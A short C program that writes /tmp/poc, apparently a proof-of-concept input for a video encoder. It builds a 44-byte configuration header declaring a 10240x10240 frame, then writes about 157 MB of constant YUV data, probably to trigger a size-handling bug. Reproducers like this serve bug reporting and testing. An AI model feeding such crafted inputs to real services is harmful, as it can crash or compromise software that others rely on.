#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;
    
    // Write 44-byte configuration header (big-endian)
    // Bytes 0-1: Width = 10240 (0x2800)
    fputc(0x28, f);
    fputc(0x00, f);
    // Bytes 2-3: Height = 10240 (0x2800)
    fputc(0x28, f);
    fputc(0x00, f);
    // Bytes 4-5: Reserved = 0
    fputc(0x00, f);
    fputc(0x00, f);
    // Byte 6: Reserved = 0
    fputc(0x00, f);
    // Byte 7: Reserved = 0
    fputc(0x00, f);
    // Byte 8: Num B frames = 0
    fputc(0x00, f);
    // Byte 9: Reserved = 0
    fputc(0x00, f);
    // Byte 10: Reserved = 0
    fputc(0x00, f);
    // Byte 11: Intra 4x4 = 0
    fputc(0x00, f);
    // Byte 12: I frame QP = 22
    fputc(0x16, f);
    // Byte 13: Reserved = 0
    fputc(0x00, f);
    // Byte 14: Reserved = 0
    fputc(0x00, f);
    // Byte 15: Reserved = 0
    fputc(0x00, f);
    // Byte 16: Reserved = 0
    fputc(0x00, f);
    // Byte 17: Reserved = 0
    fputc(0x00, f);
    // Byte 18: Reserved = 0
    fputc(0x00, f);
    // Byte 19: Reserved = 0
    fputc(0x00, f);
    // Byte 20: Enable q-pel = 1
    fputc(0x01, f);
    // Byte 21: Reserved = 0
    fputc(0x00, f);
    // Byte 22: Reserved = 0
    fputc(0x00, f);
    // Byte 23: Reserved = 0
    fputc(0x00, f);
    // Byte 24: Reserved = 0
    fputc(0x00, f);
    // Byte 25: Reserved = 0
    fputc(0x00, f);
    // Byte 26: I interval = 0
    fputc(0x00, f);
    // Byte 27: Reserved = 0
    fputc(0x00, f);
    // Bytes 28-42: 15 zero bytes
    for (int i = 0; i < 15; i++) {
        fputc(0x00, f);
    }
    // Byte 43: SEND_EOS_WITH_LAST_FRAME = 0
    fputc(0x00, f);
    
    // Write YUV420 data for 10240x10240 frame
    // Y plane: 10240*10240 = 104857600 bytes
    for (int i = 0; i < 104857600; i++) {
        fputc(0x80, f);
    }
    // U plane: 5120*5120 = 26214400 bytes
    for (int i = 0; i < 26214400; i++) {
        fputc(0x80, f);
    }
    // V plane: 5120*5120 = 26214400 bytes
    for (int i = 0; i < 26214400; i++) {
        fputc(0x80, f);
    }
    
    fclose(f);
    return 0;
}